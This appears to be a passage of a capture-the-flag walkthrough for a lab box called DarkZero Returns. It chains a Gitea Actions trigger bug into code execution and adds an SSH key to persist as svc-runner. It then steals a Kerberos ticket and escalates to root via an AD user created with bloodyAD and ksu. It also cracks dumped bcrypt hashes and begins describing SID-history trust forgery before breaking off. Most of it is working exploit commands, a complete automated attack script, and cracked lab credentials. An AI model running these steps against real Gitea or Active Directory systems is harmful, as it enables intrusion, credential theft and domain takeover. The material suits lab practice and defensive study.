> 1. Fork target repository in Gitea.
> 2. Create an isolated branch with a malicious `.gitea/workflows/test.yaml` workflow.
> 3. Submit a Pull Request targeting `main`.
> 4. Trigger the review comment event to bypass fork sandboxing (CVE-2026-20750).
> 5. Catch incoming reverse shell as `svc-runner`.

	(*) we Fork the repo.
	(*) we Inject a workflow triggered by pull_request_review_comment.
	(*) Open a PR.
	(*) Use the API to post a comment, triggering the logic bug.

- 🔍 *The Impact:-*
Because the act_runner on this specific machine is configured to execute jobs locally on the host filesystem (rather than inside an isolated Docker container), achieving code execution inside the workflow translates directly to Remote Code Execution (RCE) on the host machine as the svc-runner user.


- 🔍 *Perfect, we've done enough theory, now lets do the exploitation...*


🛠️ PHASE 1: Gearing Up (Auth + Keys)

Every API call we make will authenticate using Kerberos (SPNEGO). We need a fresh TGT. We also need our SSH keypair — the public half is the "payload", the private half is our "master key" to svc-runner.


```bash
josh@SRV01:~$ echo "Rangers1" | kinit josh@DARKZERO.EXT
Password for josh@DARKZERO.EXT: 
Warning: Your password will expire in less than one hour on Tue 14 Sep 2100 02:48:05 AM UTC

josh@SRV01:~$ klist
Ticket cache: FILE:/tmp/josh.ccache
Default principal: josh@DARKZERO.EXT

Valid starting       Expires              Service principal
08/27/2026 21:28:05  08/28/2026 07:28:05  krbtgt/DARKZERO.EXT@DARKZERO.EXT
        renew until 09/03/2026 21:28:05



ssh-keygen -t ed25519 -f ./htb_key2 -N "" -q #Generate a fresh SSH keypair (no passphrase, quiet mode)


load public key in a variable for further usage

export PUBKEY=$(cat ./htb_key2.pub)



🛠️ PHASE 2: The Setup (Fork + Unique Branch)

We can't write to the base repo, so we fork it (we become admin of the copy). We create a timestamped branch so every attempt is a clean slate — this prevents the "PR already exists" error that plagued earlier attempts.


josh@SRV01:~$ # 1. FORK the base repo into josh's namespace

curl -s --negotiate -u : -X POST -H "Content-Type: application/json" -d '{}' \
  "http://gitea.darkzero.ext:3000/api/v1/repos/DarkZero/DarkZero-Campaigns/forks" | jq '.full_name'

"darkzero-ext_josh/DarkZero-Campaigns"



josh@SRV01:~$ # 2. Create a UNIQUE branch on our fork
export BRANCH="pwn-$(date +%s)"
echo "[*] Branch name: $BRANCH"

curl -s --negotiate -u : -X POST -H "Content-Type: application/json" \
  -d "{\"new_branch_name\":\"$BRANCH\", \"old_branch_name\":\"main\"}" \
  "http://gitea.darkzero.ext:3000/api/v1/repos/darkzero-ext_josh/DarkZero-Campaigns/branches" | jq '.name'


[*] Branch name: pwn-1787866364
"pwn-1787866364"



🛠️ PHASE 3: The Payload (Malicious Workflow)
```
```bash
cat > /tmp/pwn.yml << EOF
name: pwn
on:
  pull_request_review_comment:
    types: [created]
jobs:
  pwn:
    runs-on: ubuntu
    steps:
      - name: persist
        run: |
          install -d -m 700 /home/svc-runner/.ssh
          echo '$PUBKEY' >> /home/svc-runner/.ssh/authorized_keys
          chmod 600 /home/svc-runner/.ssh/authorized_keys
          cat /home/svc-runner/user.txt
EOF
```

This YAML is the "malicious blueprint". It listens for pull_request_review_comment (the buggy trigger). When executed by the runner (as svc-runner), it writes our public key into svc-runner's authorized_keys.


```bash
josh@SRV01:~$ #  Base64-encode it (Gitea's contents API expects base64)
export CONTENT_B64=$(base64 -w0 /tmp/pwn.yml)



josh@SRV01:~$ # UPLOAD it to .gitea/workflows/pwn.yml on our branch

curl -s --negotiate -u : -X POST -H "Content-Type: application/json" \
  -d "{\"content\":\"$CONTENT_B64\", \"message\": \"add workflow\", \"branch\": \"$BRANCH\"}" \
  "http://gitea.darkzero.ext:3000/api/v1/repos/darkzero-ext_josh/DarkZero-Campaigns/contents/.gitea%2Fworkflows%2Fpwn.yml" | jq '.content.path'

".gitea/workflows/pwn.yml"



🛠️ PHASE 4: The Trigger (PR + Review Comment Bug)

The PR links your malicious branch to the base repo (gives Gitea visibility). The review comment is the trigger pull that fires the buggy event path, skipping approval and executing your YAML as svc-runner.

josh@SRV01:~$ # 1. OPEN THE PULL REQUEST (head = your fork:branch, base = main)

PR_RESP=$(curl -s --negotiate -u : -X POST -H "Content-Type: application/json" \
  -d "{\"title\":\"pwn\", \"body\": \"pwn\", \"head\": \"darkzero-ext_josh:$BRANCH\", \"base\": \"main\"}" \
  "http://gitea.darkzero.ext:3000/api/v1/repos/DarkZero/DarkZero-Campaigns/pulls")


josh@SRV01:~$ export PR_NUM=$(echo "$PR_RESP" | jq -r '.number')
export HEAD_SHA=$(echo "$PR_RESP" | jq -r '.head.sha')
echo "[+] PR #$PR_NUM created | Head SHA: $HEAD_SHA"

[+] PR #1 created | Head SHA: e927ad2c9257b6a66059f790e75c92e1cf8222af


josh@SRV01:~$ # 2. FIRE THE BUG: post a review comment to trigger the workflow
curl -s --negotiate -u : -X POST -H "Content-Type: application/json" \
  -d "{\"event\":\"COMMENT\", \"body\": \"pwn\", \"commit_id\": \"$HEAD_SHA\"}" \
  "http://gitea.darkzero.ext:3000/api/v1/repos/DarkZero/DarkZero-Campaigns/pulls/$PR_NUM/reviews" | jq '.id'

1


# 3. Wait for the runner to execute, then SSH in as svc-runner


and booommmm.........

josh@SRV01:~$ ssh -i ./htb_key2 -o StrictHostKeyChecking=no svc-runner@127.0.0.1
Warning: Permanently added '127.0.0.1' (ED25519) to the list of known hosts.

svc-runner@SRV01:~$ id
uid=780601113(svc-runner) gid=780600513(domain users) groups=780600513(domain users),780601114(servicehandler)


go get the user flag.. we've been craving for it.

for ease of work this is the bash script that can be used to pivot from josh to svc-runner, if you're lazy like me :)
```
```bash
#!/bin/bash
# ==============================================================================
# DarkZero HTB - Master Exploit Script (Josh -> Svc-Runner)
# ==============================================================================
# Automates: Auth -> Fork -> Branch -> Payload -> PR -> Gitea 1.25 Bug -> SSH
# ==============================================================================

# --- Configuration ---
JOSH_USER="josh"
JOSH_PASS="Rangers1"
DOMAIN="DARKZERO.EXT"
GITEA_URL="http://gitea.darkzero.ext:3000"
TARGET_REPO="DarkZero/DarkZero-Campaigns"

# --- Step 1: Authentication ---
echo "[*] Step 1: Authenticating as $JOSH_USER..."
export KRB5CCNAME=/tmp/josh.ccache
echo "$JOSH_PASS" | kinit "$JOSH_USER@$DOMAIN" 2>/dev/null
if ! klist | grep -q "$DOMAIN"; then
    echo "[-] Kerberos authentication failed. Check password."
    exit 1
fi
echo "[+] Kerberos TGT obtained."

# --- Step 2: SSH Key Generation ---
echo "[*] Step 2: Generating SSH Key Pair..."
rm -f ./htb_key2 ./htb_key2.pub
ssh-keygen -t ed25519 -f ./htb_key2 -N "" -q
PUBKEY=$(cat ./htb_key2.pub)
echo "[+] Public Key: $PUBKEY"

# --- Step 3: Fork Repository ---
echo "[*] Step 3: Forking repository..."
FORK_RESP=$(curl -s --negotiate -u : -X POST -H "Content-Type: application/json" -d '{}' "$GITEA_URL/api/v1/repos/$TARGET_REPO/forks")
FORK_USER=$(echo "$FORK_RESP" | jq -r '.owner.login' 2>/dev/null)
if [ "$FORK_USER" == "null" ] || [ -z "$FORK_USER" ]; then
    FORK_USER="darkzero-ext_josh" # Fallback to known username
fi
MY_FORK="$FORK_USER/DarkZero-Campaigns"
echo "[+] Fork identified as: $MY_FORK"

# --- Step 4: Create Unique Branch ---
# Using a timestamp ensures we never hit "branch exists" or "PR exists" errors
BRANCH_NAME="pwn-$(date +%s)"
echo "[*] Step 4: Creating unique branch '$BRANCH_NAME'..."
curl -s --negotiate -u : -X POST -H "Content-Type: application/json" \
  -d "{\"new_branch_name\":\"$BRANCH_NAME\", \"old_branch_name\":\"main\"}" \
  "$GITEA_URL/api/v1/repos/$MY_FORK/branches" > /dev/null
echo "[+] Branch created."

# --- Step 5: Upload Malicious Workflow ---
echo "[*] Step 5: Injecting payload into workflow..."
cat > /tmp/pwn.yml << EOF
name: pwn
on:
  pull_request_review_comment:
    types: [created]
jobs:
  pwn:
    runs-on: ubuntu
    steps:
      - name: persist
        run: |
          install -d -m 700 /home/svc-runner/.ssh
          echo '$PUBKEY' >> /home/svc-runner/.ssh/authorized_keys
          chmod 600 /home/svc-runner/.ssh/authorized_keys
          cat /home/svc-runner/user.txt
EOF

CONTENT_B64=$(base64 -w0 /tmp/pwn.yml)
curl -s --negotiate -u : -X POST -H "Content-Type: application/json" \
  -d "{\"content\":\"$CONTENT_B64\", \"message\": \"pwn\", \"branch\": \"$BRANCH_NAME\"}" \
  "$GITEA_URL/api/v1/repos/$MY_FORK/contents/.gitea%2Fworkflows%2Fpwn.yml" > /dev/null
echo "[+] Payload uploaded."

# --- Step 6: Create Pull Request ---
echo "[*] Step 6: Creating Pull Request..."
PR_RESP=$(curl -s --negotiate -u : -X POST -H "Content-Type: application/json" \
  -d "{\"title\":\"pwn\", \"body\": \"pwn\", \"head\": \"$FORK_USER:$BRANCH_NAME\", \"base\": \"main\"}" \
  "$GITEA_URL/api/v1/repos/$TARGET_REPO/pulls")

PR_NUM=$(echo "$PR_RESP" | jq -r '.number')
HEAD_SHA=$(echo "$PR_RESP" | jq -r '.head.sha')

if [ "$PR_NUM" == "null" ] || [ -z "$PR_NUM" ]; then
    echo "[-] PR Creation failed. Response:"
    echo "$PR_RESP"
    exit 1
fi
echo "[+] PR #$PR_NUM created (SHA: $HEAD_SHA)."

# --- Step 7: Trigger Gitea 1.25 Bug ---
echo "[*] Step 7: Triggering workflow via Review Comment (The Bug)..."
curl -s --negotiate -u : -X POST -H "Content-Type: application/json" \
  -d "{\"event\":\"COMMENT\", \"body\": \"pwn\", \"commit_id\": \"$HEAD_SHA\"}" \
  "$GITEA_URL/api/v1/repos/$TARGET_REPO/pulls/$PR_NUM/reviews" > /dev/null
echo "[+] Trigger sent! The runner is now executing the payload..."

# --- Step 8: Wait and Connect ---
echo "[*] Step 8: Waiting 15 seconds for execution..."
sleep 15

echo "[*] Step 9: Connecting as svc-runner..."
chmod 600 ./htb_key2
ssh -i ./htb_key2 -o StrictHostKeyChecking=no svc-runner@127.0.0.1
```

## Step 4 - Active Directory Enumeration & DC02 Local Root

### Extracting Kerberos CCACHE & Domain Controller Reconnaissance

- 🔍 *As for the Privilege Escalation we are standing right next to the domain dc02, however we are good to perform the AD enumeration from now on. while there was nothing interesting found on the shell except this gitea directory which was inaccessible from the josh's shell*

```bash
svc-runner@SRV01:/tmp$ ls -la /opt/gitea*
total 20488
drwxr-x--- 4 svc-runner root             4096 May 20 23:36 .
drwxr-xr-x 6 root       root             4096 Jul 21 05:39 ..
-rwxr-x--- 1 svc-runner root         20951202 Feb 18  2026 act_runner
drwxr-x--- 4 svc-runner root             4096 May 20 23:33 .cache
-rwxr-x--- 1 svc-runner root              140 May 20 23:33 config.yaml
drwxr-xr-x 4 svc-runner domain users     4096 May 20 23:36 .npm
-rwxr-x--- 1 svc-runner root              460 May 20 23:33 .runner


svc-runner@SRV01:/tmp$ cat /opt/gitea*/config*
runner:
  name: "ubuntu-domain-runner"
  labels:
    - "ubuntu:host"
  capacity: 1
cache:
  enabled: true
  dir: "/opt/gitea-runner/.cache"
```

- 🔍 *While the temp folder has a Kerberos ticket already saved*

```bash
svc-runner@SRV01:/tmp$ ls
agent
josh.ccache
krb5cc_gitea
pwn.yml
snap-private-tmp
systemd-private-ec097feafbf7450984e7fa3006d9fb86-darkzero_campaigns.service-hZntBK
systemd-private-ec097feafbf7450984e7fa3006d9fb86-fwupd.service-DoTtpg
systemd-private-ec097feafbf7450984e7fa3006d9fb86-ModemManager.service-pVwKhJ
systemd-private-ec097feafbf7450984e7fa3006d9fb86-polkit.service-v0tef5
systemd-private-ec097feafbf7450984e7fa3006d9fb86-systemd-logind.service-f6qtqE
systemd-private-ec097feafbf7450984e7fa3006d9fb86-systemd-resolved.service-5Mq3ns
systemd-private-ec097feafbf7450984e7fa3006d9fb86-systemd-timesyncd.service-LCHB01
systemd-private-ec097feafbf7450984e7fa3006d9fb86-upower.service-9ESN0M


svc-runner@SRV01:/tmp$ export KRB5CCNAME=krb5cc_gitea
svc-runner@SRV01:/tmp$ klist
Ticket cache: FILE:krb5cc_gitea
Default principal: svc-runner@DARKZERO.EXT

Valid starting       Expires              Service principal
08/27/2026 20:05:05  08/28/2026 06:05:05  krbtgt/DARKZERO.EXT@DARKZERO.EXT
        renew until 09/03/2026 20:05:05

this is a valid ticket.
```

- 🔍 *we need to get this ticket in our machine to perform the AD enumeration*

	1. base64 -w0 /tmp/krb5cc_gitea #convert ticket into base64 
	2. echo '`&lt;PASTE_B64&gt;`' | base64 -d > svc-runner.ccache (in your machine)
	3. chmod 600 svc-runner.ccache #grant permission 
	4. export KRB5CCNAME=$(pwd)/svc-runner.ccache 


# klist
Ticket cache: FILE:/home/kali/HTB/Season-11/DarkzeroReturns/svc-runner.ccache
Default principal: svc-runner@DARKZERO.EXT

Valid starting       Expires              Service principal
08/27/2026 20:05:05  08/28/2026 06:05:05  krbtgt/DARKZERO.EXT@DARKZERO.EXT
        renew until 09/03/2026 20:05:05


- 🔍 *Perfect we got the ticket, now lets start the AD enumeration.*


lets start by listing all the domain users

impacket-GetADUsers -k -no-pass -dc-ip 172.16.20.2 DARKZERO.EXT/svc-runner -all
Impacket v0.14.0.dev0+20251114.155318.8925c2ce - Copyright Fortra, LLC and its affiliated companies 

[*] Getting machine hostname
[-] Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)


> ⚠️ **Technical Detail:** ahh the boss! Kerberos time sync error, the goat.


sudo date -s "$(sshpass -p 'Rangers1' ssh -o StrictHostKeyChecking=no josh@dzcampaigns.htb date)"
Warning: Permanently added '10.129.97.182' (ED25519) to the list of known hosts.
Thu Aug 27 10:15:26 PM UTC 2026


the usual way with ntpdate doesn't works for some reason, so we can fetch the time with ssh shell and set it as our date.

- 🔍 *now try again...*

impacket-GetADUsers -k -no-pass -dc-ip 172.16.20.2 DARKZERO.EXT/svc-runner -all
Impacket v0.14.0.dev0+20251114.155318.8925c2ce - Copyright Fortra, LLC and its affiliated companies 

[*] Getting machine hostname
[*] Querying DC02 for information about domain.
Name                  Email                           PasswordLastSet      LastLogon           
--------------------  ------------------------------  -------------------  -------------------
Administrator                                         2026-05-18 12:41:22.805234  2026-07-23 20:35:01.916591 
Guest                                                 &lt;never&gt;              &lt;never&gt;             
krbtgt                                                2026-04-06 14:16:41.351015  &lt;never&gt;             
                                                      2026-08-27 20:17:43.130682  &lt;never&gt;             
david                                                 2026-05-18 12:57:32.478077  &lt;never&gt;             
william                                               2026-05-18 12:57:32.633953  &lt;never&gt;             
celia                                                 2026-07-14 13:59:09.283092  &lt;never&gt;             
josh                                                  2026-05-20 22:38:58.851243  2026-08-27 22:15:25.262726 
svc-gitea                                             2026-05-20 22:50:00.501204  2026-08-27 20:04:38.036185 
svc-runner                                            2026-05-20 22:50:01.066715  2026-08-27 20:05:05.647826 



- 🔍 *Lets look for any  Kerberoastable accounts (SPNs)*

 impacket-GetUserSPNs -k -no-pass -dc-ip 172.16.20.2 DARKZERO.EXT/svc-runner
Impacket v0.14.0.dev0+20251114.155318.8925c2ce - Copyright Fortra, LLC and its affiliated companies 

[*] Getting machine hostname
ServicePrincipalName          Name       MemberOf                                       PasswordLastSet             LastLogon                   Delegation 
----------------------------  ---------  ---------------------------------------------  --------------------------  --------------------------  ----------
HTTP/gitea.darkzero.ext:3000  svc-gitea  CN=ServiceHandler,CN=Users,DC=darkzero,DC=ext  2026-05-20 22:50:00.501204  2026-08-27 20:04:38.036185             
HTTP/gitea.darkzero.ext       svc-gitea  CN=ServiceHandler,CN=Users,DC=darkzero,DC=ext  2026-05-20 22:50:00.501204  2026-08-27 20:04:38.036185             

none :(



- 🔍 *Lets list all domains*


ldapsearch -Y GSSAPI -H ldap://dc02.darkzero.ext -b "DC=darkzero,DC=ext" \
  "(objectClass=organizationalUnit)" ou
SASL/GSSAPI authentication started
SASL username: svc-runner@DARKZERO.EXT
SASL SSF: 256
SASL data security layer installed.
# extended LDIF
#
# LDAPv3
# base &lt;DC=darkzero,DC=ext&gt; with scope subtree
# filter: (objectClass=organizationalUnit)
# requesting: ou 
#

# Domain Controllers, darkzero.ext
dn: OU=Domain Controllers,DC=darkzero,DC=ext
ou: Domain Controllers

# GiteaMigration, darkzero.ext
dn: OU=GiteaMigration,DC=darkzero,DC=ext
ou: GiteaMigration

# search reference
ref: ldap://ForestDnsZones.darkzero.ext/DC=ForestDnsZones,DC=darkzero,DC=ext

# search reference
ref: ldap://DomainDnsZones.darkzero.ext/DC=DomainDnsZones,DC=darkzero,DC=ext

# search reference
ref: ldap://darkzero.ext/CN=Configuration,DC=darkzero,DC=ext

# search result
search: 4
result: 0 Success

# numResponses: 6
# numEntries: 2
# numReferences: 3


- 🔍 *Perfect now lets see, if this user has any writeables over any of these OU's*

bloodyAD -u svc-runner -d DARKZERO.EXT -k --host dc02.darkzero.ext get writable

distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=darkzero,DC=ext
permission: WRITE

distinguishedName: CN=svc-runner,CN=Users,DC=darkzero,DC=ext
permission: WRITE

distinguishedName: OU=GiteaMigration,DC=darkzero,DC=ext
permission: CREATE_CHILD

distinguishedName: DC=_msdcs.darkzero.ext,CN=MicrosoftDNS,DC=ForestDnsZones,DC=darkzero,DC=ext
permission: CREATE_CHILD


ahhaa! we have create child on OU=GiteaMigration and  DC=_msdcs.darkzero.ext. good this will work. but before doing the hands dirty on OU lets take a quick look at bloodhound as well.


bloodhound-python -d darkzero.ext -u svc-runner -k -no-pass \
  -dc dc02.darkzero.ext -ns 172.16.20.2 -c All --zip --disable-autogc
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: darkzero.ext
INFO: Using TGT from cache
INFO: Found TGT with correct principal in ccache file.
INFO: Connecting to LDAP server: dc02.darkzero.ext
Traceback (most recent call last):
  File "/home/kali/Tools/BloodHound.py/venv/bin/bloodhound-python", line 8, in `&lt;module&gt;`                           
    sys.exit(main())
             ~~~~^^
  File "/home/kali/Tools/BloodHound.py/venv/lib/python3.13/site-packages/bloodhound/__init__.py", line 347, in main                                                        
    bloodhound.run(collect=collect,
    ~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^
                   num_workers=args.workers,
                   ^^^^^^^^^^^^^^^^^^^^^^^^^
    ...`&lt;4 lines&gt;`...
                   exclude_dcs=args.exclude_dcs,
                   ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
                   fileNamePrefix=args.outputprefix)
                   ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/home/kali/Tools/BloodHound.py/venv/lib/python3.13/site-packages/bloodhound/__init__.py", line 78, in run 
    self.pdc.prefetch_info('objectprops' in collect, 'acl' in collect, cache_computers=do_computer_enum)          
    ~~~~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^          
  File "/home/kali/Tools/BloodHound.py/venv/lib/python3.13/site-packages/bloodhound/ad/domain.py", line 576, in prefetch_info                                              
    self.get_objecttype()
    ~~~~~~~~~~~~~~~~~~~^^
  File "/home/kali/Tools/BloodHound.py/venv/lib/python3.13/site-packages/bloodhound/ad/domain.py", line 259, in get_objecttype                                             
    self.ldap_connect()
    ~~~~~~~~~~~~~~~~~^^
  File "/home/kali/Tools/BloodHound.py/venv/lib/python3.13/site-packages/bloodhound/ad/domain.py", line 70, in ldap_connect                                                
    ldap = self.ad.auth.getLDAPConnection(hostname=self.hostname, ip=ip,
                                          baseDN=self.ad.baseDN, protocol=protocol)
  File "/home/kali/Tools/BloodHound.py/venv/lib/python3.13/site-packages/bloodhound/ad/authentication.py", line 164, in getLDAPConnection                                  
    bound = conn.bind()
  File "/home/kali/Tools/BloodHound.py/venv/lib/python3.13/site-packages/ldap3/core/connection.py", line 635, in bind                                                      
    raise LDAPUnknownAuthenticationMethodError(self.last_error)
ldap3.core.exceptions.LDAPUnknownAuthenticationMethodError: NTLM needs domain\username and a password 


- 🔍 *Unfortunately, the Bloodhound tool is causing an error. Rather than submitting to the friction of this protocol dispute, we will pivot directly to the confirmed objective: exploiting the child object creation rights on the GiteaMigration OU. :)*




- 🔍 *Malicious Child Creation :*

as we know that we can create a child object inside GiteaMigration, we will use bloodyAD to create an AD object in that OU.

bloodyAD -u svc-runner -d DARKZERO.EXT -k --host dc02.darkzero.ext --dc-ip 172.16.20.2 \
  add user root 'RootPass123!' --ou 'OU=GiteaMigration,DC=darkzero,DC=ext'

[+] root created


To ensure if the user actually created or not we can use the impacket.

 impacket-GetADUsers -k -no-pass -dc-ip 172.16.20.2 DARKZERO.EXT/svc-runner -all
Impacket v0.14.0.dev0+20251114.155318.8925c2ce - Copyright Fortra, LLC and its affiliated companies 

[*] Getting machine hostname
[*] Querying DC02 for information about domain.
Name                  Email                           PasswordLastSet      LastLogon           
--------------------  ------------------------------  -------------------  -------------------
Administrator                                         2026-05-18 12:41:22.805234  2026-07-23 20:35:01.916591 
Guest                                                 &lt;never&gt;              &lt;never&gt;             
krbtgt                                                2026-04-06 14:16:41.351015  &lt;never&gt;             
                                                      2026-08-29 22:06:36.822845  &lt;never&gt;             
david                                                 2026-05-18 12:57:32.478077  &lt;never&gt;             
william                                               2026-05-18 12:57:32.633953  &lt;never&gt;             
celia                                                 2026-07-14 13:59:09.283092  &lt;never&gt;             
josh                                                  2026-05-20 22:38:58.851243  2026-08-29 22:13:14.677181 
svc-gitea                                             2026-05-20 22:50:00.501204  2026-08-29 21:53:39.169801 
svc-runner                                            2026-05-20 22:50:01.066715  2026-08-29 21:54:13.522662 
root                                                  2026-08-29 22:12:32.026066  &lt;never&gt;


perfect! user is created.

### ksu Identity Switch to System Root (UID 0)

- 🔍 *Now to achieve root on DC02, we initiate Kerberos-based ksu authentication and authorization:*

[?] What is ksu? 

The ksu (Kerberos Substitute User) command is a secure, Kerberized version of the traditional Linux su program. Its purpose is to securely change a user’s real and effective user ID to a target user (like root) by relying on Kerberos tickets instead of local password hashes


The ksu workflow operates in two main phases: Authentication and Authorization.

[ Linux User ] ──(1. kinit / Get TGT)──> [ Active Directory (KDC) ]
      │                                             │
(2. ksu root)                                       │
      │                                             │
      ├──(3. Request host/ Service Ticket)─────────►│
      │◄─(4. Issue Service Ticket)──────────────────┘
      │
(5. Check .k5login / .k5users)
      │
[ Granted Root Shell ]


Step 1: Requesting the Ticket Granting Ticket (TGT) via kinit : The local Linux user logs in or switches to the newly created Active Directory object using the kinit utility.

Step 2: Executing the Identity Switch (ksu root) : With a valid domain identity loaded into the session cache, the user initiates the privilege escalation request.

Step 3: Service Ticket Request : Before changing user contexts, ksu must cryptographically verify that the TGT held by the user is valid and current.

Step 4: Issuance of the Service Ticket : The KDC processes the request against the active TGT session.

Step 5: Local Authorization Evaluation (.k5login / .k5users) : Now that identity is proven, ksu evaluates local security policies to determine if this domain user has permission to become the local system root.

> ⚠️ **Technical Detail:** Because both authentication (Steps 1–4) and local authorization (Step 5) checks succeed, ksu changes the effective User ID (UID) of the process to 0 and spawns an interactive root shell.


- 🔍 *Now lets start by request a TGT for root with...*

```bash
svc-runner@SRV01:/tmp$ echo "RootPass123!" | kinit root@DARKZERO.EXT
Password for root@DARKZERO.EXT: 
Warning: Your password will expire in less than one hour on Tue 14 Sep 2100 02:48:05 AM UTC


ensure.................

svc-runner@SRV01:/tmp$ klist
Ticket cache: KEYRING:persistent:780601113:780601113
Default principal: root@DARKZERO.EXT

Valid starting       Expires              Service principal
08/29/2026 22:36:47  08/30/2026 08:36:47  krbtgt/DARKZERO.EXT@DARKZERO.EXT
        renew until 09/05/2026 22:36:38


now with ksu will change the ID.

svc-runner@SRV01:/tmp$ ksu root
Authenticated root@DARKZERO.EXT
Account root: authorization for root@DARKZERO.EXT successful
Changing uid to root


root@SRV01:/tmp# whoami
root
root@SRV01:/tmp# id
uid=0(root) gid=0(root) groups=0(root)


booommmm! we pivoted!!!!
```

- 🔍 *Now as we know all the folder and file structure the one and only folder lefts unchecked is of course /root folder. lets take a look at it*

```bash
root@SRV01:~# ls
darkzero_campaigns_backup.sql




INSERT INTO `users` VALUES (1,'admin@dzcampaigns.htb','admin','$2b$10$HDdWzYvp1IWFD9TB4JsuCerlh.vKchv/LmBruCmKGH19hPP7IXvjm','admin','2026-04-19 15:34:56');
INSERT INTO `users` VALUES (2,'celia.p@dzcampaigns.htb','celia','$2b$10$2L.IKTOkBtwtWuKcAF/VJ.kUKiBHLQ8hPeg2KYJJXFOUdga2iLsoC','player','2026-04-20 17:20:14');
INSERT INTO `users` VALUES (3,'jerry.ap@dzcampaigns.htb','jerry','$2b$10$otSLTatDHIAAp3H58YYaTOgdhMlpbWBTEq1.MWFq5se6OOG3nV2Wy','player','2026-04-20 17:27:37');
```

- 🔍 *Good! the table contains some credentials. that's all we needed, the user celia and jerry are new here. with their bcrypt hash. lets try cracking them*

hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt

$2b$10$2L.IKTOkBtwtWuKcAF/VJ.kUKiBHLQ8hPeg2KYJJXFOUdga2iLsoC:babygurl13 --> celia

unfortunately jerry's hash remain uncrackable. we still got celia's creds, it might be the intended way i guess.



- 🔍 *Now that we have pure creds we will resolve the previous bloodhound-python issue, where it was refusing the Kerberos authentication and switching over LDAP/LDAPS. but we have raw creds we can extract the AD info easily.*

(fyi:- we could've got the bloodhound zip with the earlier root user we created inside the GiteaMigration OU, i forgot that maybe because i am dumb :) )


- 🔍 *Anyways lets get the bloodhound finally.*

bloodhound-python -d darkzero.ext -u celia -p 'babygurl13' -no-pass \
  -dc dc02.darkzero.ext -ns 172.16.20.2 -c All --zip --disable-autogc
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: darkzero.ext
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc02.darkzero.ext
WARNING: LDAP Authentication is refused because LDAP signing is enabled. Trying to connect over LDAPS instead...
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 2 computers
INFO: Connecting to LDAP server: dc02.darkzero.ext
WARNING: LDAP Authentication is refused because LDAP signing is enabled. Trying to connect over LDAPS instead...
INFO: Found 11 users
INFO: Found 59 groups
INFO: Found 2 gpos
INFO: Found 2 ous
INFO: Found 22 containers
INFO: Found 1 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: srv01.darkzero.ext
INFO: Querying computer: DC02.darkzero.ext
INFO: Done in 01M 26S
INFO: Compressing output into 20260829224845_bloodhound.zip



![web-img](images/DarkZeroRetunrs/d19.png)

first look of celia-->

	CELIA (owned) → MemberOf → DOMAIN ADMINS, DOMAIN USERS, GITEAADMINS.

	DOMAIN ADMINS → MemberOf → ADMINISTRATORS and DENIED RODC PASSWORD REPLICATION GROUP (that last one is a default Domain Admins membership, not a privilege).

	Domain Admins effectively holds GenericAll over the domain — that's why Celia has 91 outbound controls 

- 🔍 *Now the celia is already an admin in darkzero.ext, so i don't think we can do much in this current domain.*

[?] However the question is  never "what can Celia do?" — it's "what can Celia give us that crosses a trust?" because we are currently on "darkzero.ext" domain which is secondary domain, but in order to compromise the whole infrastructure we somehow need to escalate to the main domain which is "darkzero.htb", hence we can call them "Trusts" and crossing the trust refers to the movement from one trust to the another!

- 🔍 *Now that we are pretty much clear on crossing the trust that we need to cross the trust which makes Everything else in her 91 edges — GenericAll on ext users, AddMember on ext groups, WriteDacl on ext OUs — is in-domain only. Those win ext... which is already won. That's the principled reason we ignored 90 of them.*




## Step 5 - Cross-Domain Trust Exploitation & Domain Admin Takeover

### BloodHound Trust Analysis & Inter-Domain Referral Architecture

- 🔍 *To traverse the trust boundary from darkzero.ext to darkzero.htb, we will perform Cross-Domain Trust Exploitation via Forged Inter-Domain Referral Tickets with SID History injection.*


[?] Cross-Domain Trust Exploitation via Forged Referral Tickets: it is an Active Directory (AD) lateral movement and privilege escalation technique. It allows an attacker who has compromised a lower-privileged AD domain (like a child domain) to cross security boundaries and gain unauthorized administrative control over a highly trusted domain (like a forest root or a parent domain).


[ Linux Attacker ]             [ DC02 (DARKZERO.EXT) ]      [ DC01 (DARKZERO.HTB) ]
       │                                  │                            │
       │───(1) Forged TGT with PAC ────►│   		        	│
       │       (Injected SID History)     │                            │
       │                                  │                            │
       │◄──(2) Issue Referral TGS ─────│                        	│
       │       (Encrypted with Trust Key) │                            │
       │                                  │                            │
       │───(3) Present Referral TGS ────┼────────────────────►	│
       │                                  │                            │
       │                                  │                   (4) Decrypts with Trust Key,
       │                                  │                       Validates PAC,
       │                                  │                       Honors SID History
       │                                  │                            │
       │◄──(5) Issue Final Service Ticket┼─────────────────────│
       │                                  │                            │
───────┴──────────────────────────────────┴────────────────────────────┴──────────
[ Result: Access Granted to HTB Resource ]


- 🔍 *Now before going any further let me give you a good explanation of this diagram and its internal working.*

🔑 Core Concepts to Understand

	 PAC (Privilege Attribute Certificate): A structure inside a Kerberos ticket that contains the user's security identifiers (SIDs) and group memberships.

	SID History: An attribute intended to retain access rights when users are moved between domains. If an account has a high-privilege SID (like Enterprise Admins) in its SID History,	Kerberos honors it.
	
	Trust Key: A shared secret password between two domains used to sign and encrypt inter-domain communications (Referral Tickets).




Step 1: Ticket Forgery & Injection

From our Linux machine, we craft a counterfeit Ticket Granting Ticket (TGT). Using administrative control over the compromised domain DARKZERO.EXT, we inject a high-privilege SID (such as the Enterprise Admins SID of the target domain, DARKZERO.HTB, because celia is already an admin member of the domain) into the SID History field of the PAC. We then present this ticket to the domain controller of the compromised domain (DC02).



Step 2: The Inter-Domain Referral

DC02 processes our request. Because the requested resource resides in a different domain (DARKZERO.HTB), DC02 generates a Referral Ticket Granting Service (TGS) ticket. Crucially, DC02 copies our injected SID History into this referral ticket and encrypts/signs it using the inter-domain Trust Key



Step 3: Crossing the Bridge

